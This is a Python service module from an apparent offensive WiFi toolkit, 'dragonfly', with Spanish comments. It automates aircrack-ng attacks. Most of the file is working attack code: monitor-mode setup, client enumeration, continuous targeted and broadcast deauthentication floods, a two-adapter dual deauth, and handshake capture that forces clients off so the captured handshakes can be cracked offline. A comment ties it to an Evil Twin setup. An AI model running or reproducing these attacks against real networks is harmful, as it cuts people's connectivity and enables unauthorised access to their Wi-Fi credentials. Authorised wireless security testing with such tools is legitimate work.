"""
dragonfly/services/wifi_service.py - Servicio central de auditoría inalámbrica (WiFi).
Implementa modo monitor, parseo de Airodump, captura de handshakes y ataques Deauth individuales y dobles.
"""

import os
import time
import random
import shutil
import subprocess
import threading
from datetime import datetime
from dragonfly.config import BASE_DIR_WIFI, BASE_DIR_CLIENTS
from dragonfly.core.executor import CommandExecutor
from dragonfly.core.network_manager import release_device, restore_device
from dragonfly.core.process_manager import ProcessManager
from dragonfly.core.subprocess_utils import safe_popen, safe_run
from dragonfly.core.session import SessionManager
from dragonfly.core.wifi_interfaces import (
    get_interface_channel,
    get_interface_info,
    get_interface_type,
    get_phy_name,
    get_wifi_interfaces,
    share_phy,
    supports_monitor,
)
from dragonfly.services.wifi_audit_service import (
    enrich_networks,
    normalize_mac,
    parse_airodump_csv,
)

# Salidas de aireplay-ng que indican que la interfaz no está realmente en
# monitor o que otro proceso la retiene. Se usan para reintentar una vez tras
# recuperar la interfaz en lugar de mostrar un error críptico al operador.
_DEAUTH_ERROR_PATTERNS = (
    ("no such bssid available", "bssid_no_disponible"),
    ("device or resource busy", "dispositivo_ocupado"),
    ("ioctl(siocsiwmode) failed", "cambio_modo_bloqueado"),
    ("operation not permitted", "permiso_denegado"),
    ("no such device", "interfaz_inexistente"),
    ("interface doesn't support", "modo_no_soportado"),
    ("monitor mode not enabled", "monitor_inactivo"),
)


def classify_deauth_output(line: str) -> str | None:
    """
    Clasifica una línea de aireplay-ng. Retorna una clave de error o ``None``.

    Se mantiene como función de módulo para poder probarla sin lanzar procesos.
    """
    lowered = (line or "").lower()
    for pattern, kind in _DEAUTH_ERROR_PATTERNS:
        if pattern in lowered:
            return kind
    return None


def line_buffered_command(cmd: list[str]) -> list[str]:
    """
    Fuerza salida línea a línea en herramientas que la bufferizan al usar una pipe.

    ``aireplay-ng`` escribe con ``printf`` y, al no tener TTY, puede retener la
    salida durante todo el ataque continuo. ``stdbuf`` permite ver y clasificar
    los errores en tiempo real. Si no está instalado, se devuelve el comando
    original sin cambios.
    """
    if not cmd or cmd[0] != "sudo" or not shutil.which("stdbuf"):
        return cmd
    return ["sudo", "stdbuf", "-oL", "-eL", *cmd[1:]]


class MultiDeauthAttack:
    """
    Gestión de dos procesos aireplay-ng en paralelo para desautenticación dual-band / doble tarjeta.
    """
    def __init__(self, mon_ifaces, bssids, channels, burst, callback=None):
        self.mon_ifaces = mon_ifaces
        self.bssids = bssids
        self.channels = channels
        self.burst = burst
        self.callback = callback or (lambda msg: None)
        self.procs = []
        self.threads = []
        self._stop_flag = False

    def start(self):
        self._stop_flag = False
        for i in range(min(2, len(self.mon_ifaces))):
            cmd = line_buffered_command([
                "sudo", "aireplay-ng",
                "--deauth", str(self.burst),
                "-a", self.bssids[i],
                self.mon_ifaces[i]
            ])
            self.callback(f"[*] Iniciando: {' '.join(cmd)}")
            proc = safe_popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            self.procs.append(proc)
            t = threading.Thread(target=self._reader, args=(proc, i), daemon=True)
            t.start()
            self.threads.append(t)

    def _reader(self, proc, idx):
        try:
            for line in iter(proc.stdout.readline, ''):
                if self._stop_flag:
                    break
                if line:
                    kind = classify_deauth_output(line)
                    if kind:
                        self.callback(f"[!] if{idx+1}: {line.rstrip()} ({kind})")
                    else:
                        self.callback(f"[if{idx+1}] {line.rstrip()}")
        except Exception as e:
            self.callback(f"[!] Error en lector {idx+1}: {e}")
        finally:
            proc.stdout.close()

    def stop(self):
        self._stop_flag = True
        for proc in self.procs:
            try:
                proc.terminate()
            except Exception:
                pass
        for proc in self.procs:
            try:
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self.procs.clear()
        self.threads.clear()


class WiFiService:
    """
    Servicio integral de auditoría inalámbrica ofensiva con Aircrack-ng suite.
    """

    def __init__(self, executor: CommandExecutor = None, process_manager: ProcessManager = None):
        self.executor = executor or CommandExecutor()
        self.pm = process_manager or ProcessManager()
        self.active_mon_iface = None
        self.active_mon_base = None
        self._released_devices = set()
        self._deauth_proc = None
        self._deauth_stop = threading.Event()
        self._deauth_generation = 0
        self._deauth_lock = threading.Lock()
        self.multi_deauth_instance = None

    # ------------------------------------------------------------------
    # Modo monitor
    # ------------------------------------------------------------------

    @staticmethod
    def _interface_exists(iface: str) -> bool:
        return bool(iface) and os.path.exists(f"/sys/class/net/{iface}")

    @staticmethod
    def _base_name(iface: str) -> str:
        """
        Deduce el nombre base de una interfaz de monitor.

        Solo elimina el sufijo ``mon`` cuando el nombre base existe de verdad;
        así ``wlan1mon`` no se confunde con una interfaz llamada ``wlan1`` si el
        driver usa nombres propios.
        """
        if not iface:
            return iface
        if iface.endswith("mon"):
            base = iface[:-3]
            if os.path.exists(f"/sys/class/net/{base}"):
                return base
        return iface

    def _find_monitor_interface(self, base: str) -> str | None:
        """Busca una vif en modo monitor asociada al ``phy`` de ``base``."""
        candidates = []
        if self._interface_exists(base) and get_interface_type(base) == "monitor":
            candidates.append(base)

        alt = f"{base}mon"
        if self._interface_exists(alt) and alt not in candidates:
            alt_type = get_interface_type(alt)
            if alt_type in (None, "monitor"):
                candidates.append(alt)

        phy = get_phy_name(base) if self._interface_exists(base) else None
        if phy:
            for iface in get_wifi_interfaces():
                if iface in candidates:
                    continue
                if get_phy_name(iface) == phy and get_interface_type(iface) == "monitor":
                    candidates.append(iface)

        return candidates[0] if candidates else None

    def _manual_enable_monitor(self, base: str) -> str | None:
        """Fuerza el modo monitor con ``iw`` como alternativa a airmon-ng."""
        if not self._interface_exists(base):
            return None
        safe_run(["sudo", "ip", "link", "set", base, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "iw", "dev", base, "set", "type", "monitor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "ip", "link", "set", base, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        return self._find_monitor_interface(base)

    @staticmethod
    def _last_meaningful_line(text: str) -> str:
        """Última línea no vacía de una salida, lista para mostrar en un error."""
        for line in reversed((text or "").splitlines()):
            cleaned = line.strip()
            if cleaned:
                return f" Detalle: {cleaned}"
        return ""

    def _set_monitor_channel(self, iface: str, channel) -> bool:
        """
        Fija el canal del monitor. Retorna True si el cambio se aplicó.

        Un fallo aquí es la señal temprana de que la interfaz sigue retenida por
        NetworkManager o wpa_supplicant ("Device or resource busy").
        """
        try:
            result = safe_run(
                ["sudo", "iw", "dev", iface, "set", "channel", str(int(channel))],
                capture_output=True,
                text=True,
                timeout=4,
            )
        except (OSError, subprocess.SubprocessError, ValueError):
            return False
        if result.returncode != 0:
            return False
        current = get_interface_channel(iface)
        return current is None or current == int(channel)

    def enable_monitor_mode(self, iface: str) -> str:
        """
        Pone una interfaz en modo monitor coordinando con NetworkManager.

        Retorna el nombre real de la interfaz en monitor (puede ser ``wlan0mon``
        si airmon-ng creó una vif nueva). Lanza ``RuntimeError`` si la interfaz
        no soporta monitor o no se pudo activar.
        """
        if not iface:
            raise ValueError("Interfaz vacía.")

        base = self._base_name(iface)
        if not self._interface_exists(base) and not self._interface_exists(iface):
            raise RuntimeError(f"La interfaz {iface} no existe.")

        if not supports_monitor(base):
            raise RuntimeError(
                f"{base} no soporta modo monitor. Seleccione un adaptador con dicha "
                "capacidad (la WiFi onboard de Raspberry Pi normalmente no puede)."
            )

        existing = self._find_monitor_interface(base)
        if existing:
            safe_run(["sudo", "ip", "link", "set", existing, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            self.active_mon_iface = existing
            self.active_mon_base = base
            self._released_devices.add(base)
            return existing

        # 1. Liberar la radio: con wpa_supplicant/NM activos el driver rechaza
        #    el cambio de tipo con "Device or resource busy".
        released = release_device(base)

        # 2. airmon-ng resuelve particularidades de cada driver. Su salida se
        #    conserva para poder diagnosticar el fallo real.
        airmon_output = ""
        try:
            result = safe_run(
                ["sudo", "airmon-ng", "start", base],
                capture_output=True,
                text=True,
                timeout=20,
            )
            airmon_output = f"{result.stdout or ''}\n{result.stderr or ''}"
        except (OSError, subprocess.SubprocessError) as exc:
            airmon_output = str(exc)

        # 3. Verificar de verdad que quedó en tipo monitor; no confiar en el
        #    código de salida de airmon-ng.
        mon = self._find_monitor_interface(base)
        if mon is None:
            mon = self._manual_enable_monitor(base)
        mon_type = get_interface_type(mon) if mon else None
        if mon is None or (mon_type is not None and mon_type != "monitor"):
            detail = self._last_meaningful_line(airmon_output)
            if not released:
                detail += " NetworkManager no confirmó la liberación de la interfaz."
            raise RuntimeError(f"No se pudo activar monitor mode en {base}.{detail}")

        safe_run(["sudo", "ip", "link", "set", mon, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        self.active_mon_iface = mon
        self.active_mon_base = base
        self._released_devices.add(base)
        return mon

    def ensure_monitor_ready(self, iface: str, channel=None) -> str:
        """
        Garantiza que ``iface`` esté en monitor (y en ``channel`` si se indica).

        Reintenta la preparación si algo volvió a tomar la interfaz. Retorna el
        nombre real de la vif en monitor.
        """
        if not iface:
            raise RuntimeError("No hay interfaz de monitor seleccionada.")

        mon = iface
        iface_type = get_interface_type(iface) if self._interface_exists(iface) else None
        if not self._interface_exists(iface) or (iface_type is not None and iface_type != "monitor"):
            mon = self.enable_monitor_mode(iface)
        else:
            base = self._base_name(iface)
            self.active_mon_iface = mon
            self.active_mon_base = base
            self._released_devices.add(base)

        if channel is not None and not self._set_monitor_channel(mon, channel):
            base = self.active_mon_base or self._base_name(mon)
            # Recuperación: soltar de nuevo la radio y reactivar el monitor.
            release_device(base)
            self.disable_monitor_mode(mon)
            mon = self.enable_monitor_mode(base)
            if not self._set_monitor_channel(mon, channel):
                raise RuntimeError(
                    f"No se pudo fijar el canal {channel} en {mon}: la interfaz "
                    "sigue ocupada por otro proceso."
                )

        return mon

    def disable_monitor_mode(self, mon_iface: str):
        """
        Detiene el modo monitor y devuelve la interfaz física a NetworkManager.

        Acepta tanto el nombre de la vif en monitor (``wlan0mon``) como el de la
        interfaz base (``wlan0``).
        """
        if not mon_iface:
            self.active_mon_iface = None
            return

        candidate_base = mon_iface[:-3] if mon_iface.endswith("mon") else mon_iface

        # Reunir todas las vif en monitor de la radio antes de detenerlas.
        monitor_vifs = []

        def _remember(candidate):
            if candidate and candidate not in monitor_vifs:
                monitor_vifs.append(candidate)

        if self._interface_exists(mon_iface) and get_interface_type(mon_iface) == "monitor":
            _remember(mon_iface)
        if self._interface_exists(candidate_base):
            _remember(self._find_monitor_interface(candidate_base))
        if not monitor_vifs and self._interface_exists(mon_iface):
            _remember(mon_iface)

        for mon in monitor_vifs:
            try:
                safe_run(
                    ["sudo", "airmon-ng", "stop", mon],
                    capture_output=True,
                    text=True,
                    timeout=20,
                )
            except (OSError, subprocess.SubprocessError):
                pass

        # Determinar la interfaz física final tras detener el monitor.
        base = candidate_base
        if not self._interface_exists(base):
            if self._interface_exists(mon_iface) and mon_iface != base:
                # airmon-ng pudo dejar la vif con otro nombre: intentar recuperar
                # el nombre original antes de devolverla a NetworkManager.
                safe_run(["sudo", "ip", "link", "set", mon_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
                try:
                    result = safe_run(
                        ["sudo", "ip", "link", "set", mon_iface, "name", base],
                        capture_output=True,
                        text=True,
                        timeout=3,
                    )
                    if result.returncode != 0 and self._interface_exists(mon_iface):
                        base = mon_iface
                except (OSError, subprocess.SubprocessError):
                    base = mon_iface if self._interface_exists(mon_iface) else base
            elif self._interface_exists(mon_iface):
                base = mon_iface

        if self._interface_exists(base):
            safe_run(["sudo", "ip", "link", "set", base, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            safe_run(["sudo", "iw", "dev", base, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            safe_run(["sudo", "ip", "link", "set", base, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            restore_device(base)

        self._released_devices.discard(base)
        active_base = self._base_name(self.active_mon_iface) if self.active_mon_iface else None
        if self.active_mon_iface == mon_iface or active_base == base:
            self.active_mon_iface = None
            self.active_mon_base = None

    def scan_networks(self, mon_iface: str, duration: int = 15, band=None):
        """
        Escanea redes inalámbricas usando airodump-ng durante el tiempo indicado.

        Retorna una lista de diccionarios enriquecidos. Se conservan las claves
        históricas ``bssid``, ``ch``, ``essid`` y ``banda`` para no romper las
        vistas existentes, y se añaden señal, seguridad, clientes, fabricante y
        score de honeypot.
        """
        scan_prefix = f"/tmp/scan_wifi_{int(time.time())}_{random.randint(1000, 9999)}"
        mon_iface = self.ensure_monitor_ready(mon_iface)
        cmd = ["sudo", "timeout", "-k", "5", f"{int(duration)}s", "airodump-ng"]
        band_key = str(band or "").strip().lower()
        scan_band = ""
        if band_key in {"2.4", "2.4ghz", "2.4 ghz", "bg"}:
            cmd.extend(["--band", "bg"])
            scan_band = "2.4"
        elif band_key in {"5", "5ghz", "5 ghz", "a"}:
            cmd.extend(["--band", "a"])
            scan_band = "5"
        cmd.extend(["-w", scan_prefix, "--output-format", "csv", mon_iface])

        try:
            safe_run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            aps, stations = parse_airodump_csv(f"{scan_prefix}-01.csv")
            for ap in aps:
                ap["scan_band"] = scan_band
            return enrich_networks(aps, stations, interfaces=[mon_iface])
        except Exception:
            return []
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except Exception:
                    pass

    def scan_clients(self, mon_iface: str, bssid: str, channel: str, duration: int = 10):
        """
        Captura clientes conectados a un punto de acceso específico.
        Retorna una lista de direcciones MAC de clientes encontrados.
        """
        scan_prefix = f"/tmp/scan_clients_{int(time.time())}_{random.randint(1000, 9999)}"
        mon_iface = self.ensure_monitor_ready(mon_iface, channel=channel)
        cmd = [
            "sudo", "timeout", "-k", "5", f"{int(duration)}s", "airodump-ng",
            "--bssid", str(bssid), "-c", str(channel),
            "-w", scan_prefix, "--output-format", "csv", mon_iface,
        ]

        try:
            safe_run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            _aps, stations = parse_airodump_csv(f"{scan_prefix}-01.csv")
            clientes = [
                station["station_mac"]
                for station in stations
                if normalize_mac(station.get("bssid"))
            ]
            return list(dict.fromkeys(clientes))
        except Exception:
            return []
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except Exception:
                    pass

    def start_handshake_capture(self, mon_iface: str, target_red: dict, cliente_mac: str = "FF:FF:FF:FF:FF:FF",
                                on_output=None, on_finish=None):
        """
        Lanza airodump-ng para capturar paquetes en segundo plano y dispara una ráfaga deauth para forzar handshake.
        """
        session_dir = SessionManager.create_session(BASE_DIR_WIFI)
        ch = target_red['ch']
        bssid = target_red['bssid']
        mon_iface = self.ensure_monitor_ready(mon_iface, channel=ch)

        if on_output:
            on_output(f"[*] Iniciando captura airodump en {session_dir}...")

        # Iniciar airodump-ng
        proc_airodump = safe_popen(
            ["sudo", "airodump-ng", "--channel", str(ch), "--bssid", bssid, "-w", f"{session_dir}/Captura", mon_iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        self.pm.register("airodump_handshake", proc_airodump)

        time.sleep(2)
        if proc_airodump.poll() is not None:
            raise RuntimeError(
                f"airodump-ng terminó inesperadamente en {mon_iface}. "
                "Compruebe que la interfaz sigue en modo monitor."
            )

        # Iniciar ráfaga deauth con aireplay-ng
        if cliente_mac and cliente_mac.upper() != "FF:FF:FF:FF:FF:FF":
            cmd_deauth = f"sudo aireplay-ng -0 10 -a {bssid} -c {cliente_mac} {mon_iface}"
            if on_output:
                on_output(f"[*] Inyectando deauth a {cliente_mac}...")
        else:
            cmd_deauth = f"sudo aireplay-ng -0 10 -a {bssid} {mon_iface}"
            if on_output:
                on_output("[*] Inyectando deauth en modo broadcast...")

        def on_after_deauth(rc):
            if on_output:
                on_output(f"[+] Archivo CAP guardado en: {session_dir}")
                on_output("[*] Puede finalizar la auditoria")
            if on_finish:
                on_finish(session_dir)

        self.executor.run_async(cmd_deauth, on_output=on_output, on_finish=on_after_deauth)
        return session_dir

    def stop_handshake_capture(self):
        """
        Detiene los procesos de captura airodump y ataque deauth de handshake de forma inmediata.
        """
        try:
            self.executor.stop_current()
        except Exception:
            pass

        self.pm.terminate_proc("airodump_handshake", timeout=1)
        self.pm.pkill("airodump-ng")
        self.pm.pkill_force("airodump-ng")
        # Solo la ráfaga de handshake (aireplay-ng -0 10 ...); no tocar el
        # deauth continuo que pueda estar usando el Evil Twin.
        self.pm.pkill(r"aireplay-ng -0 10", full=True)
        self.pm.pkill_force(r"aireplay-ng -0 10", full=True)

    def stop_handshake_audit(self, mon_iface: str = None):
        """
        Finaliza la captura de handshake y restaura la red usando el flujo estándar del sistema.
        """
        self.stop_handshake_capture()
        self.restore_wifi_system(mon_iface or self.active_mon_iface)

    def start_deauth_attack(self, mon_iface: str, target_red: dict, cliente_mac: str = None,
                            count: str = "0", on_output=None, on_finish=None):
        """
        Lanza un ataque de desautenticación dirigido o broadcast.

        La preparación de la interfaz (liberar NetworkManager, verificar monitor
        y fijar canal) se hace antes de lanzar aireplay-ng. Si el proceso falla
        con un error de dispositivo ocupado/BSSID no disponible se reintenta una
        vez tras recuperar la interfaz.
        """
        log = on_output or (lambda _msg: None)
        self.stop_deauth_attack()
        try:
            mon_iface = self.ensure_monitor_ready(mon_iface, channel=target_red['ch'])
        except Exception as exc:
            log(f"[!] No se pudo preparar el deauth: {exc}")
            raise

        with self._deauth_lock:
            self._deauth_generation += 1
            generation = self._deauth_generation
            self._deauth_stop.clear()

        def build_cmd(iface):
            cmd = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", target_red['bssid']]
            if cliente_mac and cliente_mac.upper() != "FF:FF:FF:FF:FF:FF":
                cmd.extend(["-c", cliente_mac])
            cmd.append(iface)
            return cmd

        def is_current():
            return (
                not self._deauth_stop.is_set()
                and generation == self._deauth_generation
            )

        def reader_loop(proc, attempt):
            failure = None
            try:
                for line in iter(proc.stdout.readline, ''):
                    if not is_current():
                        break
                    if not line:
                        continue
                    kind = classify_deauth_output(line)
                    if kind and failure is None:
                        failure = kind
                        log(f"[!] {line.rstrip()} ({kind})")
                    else:
                        log(line.rstrip())
                proc.stdout.close()
                rc = proc.wait()
            except Exception as exc:
                rc = -1
                failure = failure or "excepcion"
                log(f"[!] Error leyendo aireplay-ng: {exc}")

            if not is_current():
                return

            if failure and attempt == 0:
                log("[*] Reintentando deauth tras recuperar la interfaz...")
                try:
                    recovered = self.ensure_monitor_ready(mon_iface, channel=target_red['ch'])
                except Exception as exc:
                    log(f"[!] No se pudo recuperar la interfaz: {exc}")
                    if on_finish:
                        on_finish(rc)
                    return
                if is_current():
                    launch(recovered, attempt + 1)
                return

            if failure:
                log("[!] El deauth no pudo iniciarse. Compruebe la interfaz, el canal y que el AP siga visible.")
            if on_finish:
                on_finish(rc)

        def launch(iface, attempt):
            cmd = line_buffered_command(build_cmd(iface))
            log(f"[*] Ejecutando: {' '.join(cmd)}")
            proc = safe_popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            self._deauth_proc = proc
            self.pm.register("deauth_active", proc)
            threading.Thread(target=reader_loop, args=(proc, attempt), daemon=True).start()

        launch(mon_iface, 0)

    def stop_deauth_attack(self):
        """Detiene el ataque deauth en curso y evita reintentos pendientes."""
        self._deauth_stop.set()
        with self._deauth_lock:
            self._deauth_generation += 1
        self.pm.terminate_proc("deauth_active", timeout=2)
        self._deauth_proc = None

    def scan_networks_dual(self, mon1: str, mon2: str, duration: int = 20):
        """
        Escanea el espectro con dos interfaces simultáneamente (útil para 2.4GHz + 5GHz).
        Retorna (redes_unicas, iface_map).

        Se mantiene la deduplicación por BSSID para compatibilidad con las vistas
        existentes. El flujo WiFi Audit 2.0 usa su propio merge por (BSSID, banda).
        """
        prefix1 = f"/tmp/dual_scan1_{int(time.time())}_{random.randint(1000, 9999)}"
        prefix2 = f"/tmp/dual_scan2_{int(time.time())}_{random.randint(1000, 9999)}"
        if share_phy(mon1, mon2):
            raise RuntimeError(
                "Las dos interfaces comparten la misma radio; use adaptadores independientes."
            )
        mon1 = self.ensure_monitor_ready(mon1)
        mon2 = self.ensure_monitor_ready(mon2)

        cmd1 = [
            "sudo", "timeout", "-k", "5", f"{int(duration)}s", "airodump-ng",
            "-w", prefix1, "--output-format", "csv", mon1,
        ]
        cmd2 = [
            "sudo", "timeout", "-k", "5", f"{int(duration)}s", "airodump-ng",
            "-w", prefix2, "--output-format", "csv", mon2,
        ]

        raw_aps = []
        all_stations = []
        iface_by_bssid = {}
        try:
            p1 = safe_popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            p2 = safe_popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            p1.wait()
            p2.wait()

            for prefix, mon_iface in ((prefix1, mon1), (prefix2, mon2)):
                aps, stations = parse_airodump_csv(f"{prefix}-01.csv")
                for ap in aps:
                    bssid = normalize_mac(ap.get("bssid"))
                    if not bssid:
                        continue
                    ap["source_iface"] = mon_iface
                    raw_aps.append(ap)
                    iface_by_bssid.setdefault(bssid, mon_iface)
                all_stations.extend(stations)
        finally:
            for prefix in (prefix1, prefix2):
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try:
                        os.remove(f"{prefix}{ext}")
                    except Exception:
                        pass

        # Deduplicar por BSSID conservando la lectura con mejor señal.
        unique_aps = {}
        for ap in raw_aps:
            bssid = normalize_mac(ap.get("bssid"))
            if not bssid:
                continue
            previous = unique_aps.get(bssid)
            if previous is None:
                unique_aps[bssid] = ap
                continue
            new_power = ap.get("power")
            old_power = previous.get("power")
            if (
                isinstance(new_power, int) and new_power != -1
                and (not isinstance(old_power, int) or old_power == -1 or new_power > old_power)
            ):
                unique_aps[bssid] = ap
                iface_by_bssid[bssid] = ap.get("source_iface", iface_by_bssid.get(bssid, mon1))

        redes_unicas = enrich_networks(
            list(unique_aps.values()),
            all_stations,
            interfaces=[mon1, mon2],
        )
        iface_map = {
            red["bssid"]: iface_by_bssid.get(red["bssid"], mon1)
            for red in redes_unicas
        }
        return redes_unicas, iface_map

    def scan_clients_passive(self, mon_iface: str, bssid: str, channel: str, duration: int = 30):
        """
        Recopila clientes asociados a un BSSID de forma pasiva en su canal durante duration segundos.
        """
        prefix = f"/tmp/client_enum_{int(time.time())}_{random.randint(1000, 9999)}"
        mon_iface = self.ensure_monitor_ready(mon_iface, channel=channel)
        cmd = [
            "sudo", "timeout", "-k", "5", f"{int(duration)}s", "airodump-ng",
            "--bssid", str(bssid), "-c", str(channel),
            "-w", prefix, "--output-format", "csv", mon_iface,
        ]
        proc = safe_popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.pm.register("client_enum", proc)
        try:
            proc.wait()
            _aps, stations = parse_airodump_csv(f"{prefix}-01.csv")
            clientes = [
                station["station_mac"]
                for station in stations
                if normalize_mac(station.get("bssid"))
            ]
            return list(dict.fromkeys(clientes))
        except Exception:
            return []
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{prefix}{ext}")
                except Exception:
                    pass

    def scan_clients_dual(self, targets: list, duration: int = 30):
        """
        targets es [(red1, mon1), (red2, mon2)]
        Lanza escaneo de clientes en paralelo en ambas tarjetas.
        Retorna [(red1, clientes1), (red2, clientes2)].
        """
        results = [None, None]
        if len(targets) >= 2 and share_phy(targets[0][1], targets[1][1]):
            raise RuntimeError(
                "Las dos interfaces comparten la misma radio; use adaptadores independientes."
            )

        def worker(idx, red, mon):
            clis = self.scan_clients_passive(mon, red['bssid'], red['ch'], duration=duration)
            results[idx] = (red, clis)

        threads = []
        for i, (red, mon) in enumerate(targets[:2]):
            t = threading.Thread(target=worker, args=(i, red, mon))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

        return [r for r in results if r is not None]

    def stop_client_enum(self):
        """Detiene cualquier proceso airodump-ng de enumeración de clientes."""
        self.pm.terminate_proc("client_enum")
        self.pm.pkill("airodump-ng")

    def save_client_results(self, data, is_dual: bool = False) -> str:
        """
        Guarda los resultados de enumeración en Resultados_Clientes/
        """
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        prefix = "Clientes_Dual" if is_dual else "Clientes_Single"
        res_dir = os.path.join(BASE_DIR_CLIENTS, f"{prefix}-{timestamp}")
        os.makedirs(res_dir, exist_ok=True)

        if is_dual:
            filepath = os.path.join(res_dir, "clientes_dual.txt")
            with open(filepath, "w") as f:
                for red, macs in data:
                    f.write(f"\n=== {red.get('essid', 'Desconocido')} ({red.get('banda', '')}, CH{red.get('ch', '')}) ===\n")
                    f.write("\n".join(macs) if macs else "Sin clientes detectados\n")
                    f.write("\n")
        else:
            red, clientes = data
            filepath = os.path.join(res_dir, "clientes.txt")
            with open(filepath, "w") as f:
                f.write(f"ESSID: {red.get('essid', '')}\nBSSID: {red.get('bssid', '')}\n\nCLIENTES CONECTADOS:\n")
                f.write("\n".join(clientes) if clientes else "No se detectaron clientes activos.\n")

        return res_dir

    def restore_wifi_system(self, mon_ifaces=None):
        """
        Detiene capturas, desactiva monitores y devuelve las interfaces a
        NetworkManager. No reinicia el servicio de red.
        """
        try:
            self.executor.stop_current()
        except Exception:
            pass
        self.stop_deauth_attack()
        self.pm.pkill("airodump-ng")
        self.pm.pkill_force("airodump-ng")
        self.pm.pkill("aireplay-ng")
        self.pm.pkill_force("aireplay-ng")

        targets = []
        if isinstance(mon_ifaces, str):
            targets = [mon_ifaces]
        elif mon_ifaces:
            targets = [iface for iface in mon_ifaces if iface]
        if self.active_mon_iface and self.active_mon_iface not in targets:
            targets.append(self.active_mon_iface)
        for base in sorted(self._released_devices):
            if base not in targets:
                targets.append(base)

        for iface in targets:
            try:
                self.disable_monitor_mode(iface)
            except Exception:
                pass

        # Red de seguridad: cualquier radio liberada que no se haya restaurado.
        for base in list(self._released_devices):
            try:
                restore_device(base)
            except Exception:
                pass
            self._released_devices.discard(base)

    def start_dual_deauth(self, mon1: str, mon2: str, red1: dict, red2: dict, burst: str = "0", callback=None):
        """
        Fija canales e inicia desautenticación dual en dos interfaces.
        """
        mon1 = self.ensure_monitor_ready(mon1, channel=red1['ch'])
        mon2 = self.ensure_monitor_ready(mon2, channel=red2['ch'])
        if share_phy(mon1, mon2):
            raise RuntimeError(
                "Las dos interfaces comparten la misma radio; use adaptadores independientes."
            )

        self.multi_deauth_instance = MultiDeauthAttack(
            mon_ifaces=[mon1, mon2],
            bssids=[red1['bssid'], red2['bssid']],
            channels=[str(red1['ch']), str(red2['ch'])],
            burst=burst,
            callback=callback
        )
        self.multi_deauth_instance.start()
        return self.multi_deauth_instance

    def stop_dual_deauth(self):
        """Detiene el ataque dual deauth."""
        if self.multi_deauth_instance:
            self.multi_deauth_instance.stop()
            self.multi_deauth_instance = None
        self.pm.pkill("aireplay-ng")

    def list_saved_handshakes(self):
        """Retorna las sesiones de captura de handshake guardadas."""
        return SessionManager.list_sessions(BASE_DIR_WIFI)

    def list_handshake_files(self, session_name: str):
        """Retorna los archivos (.cap, etc.) de una sesión."""
        session_path = os.path.join(BASE_DIR_WIFI, session_name)
        return SessionManager.list_session_files(session_path)
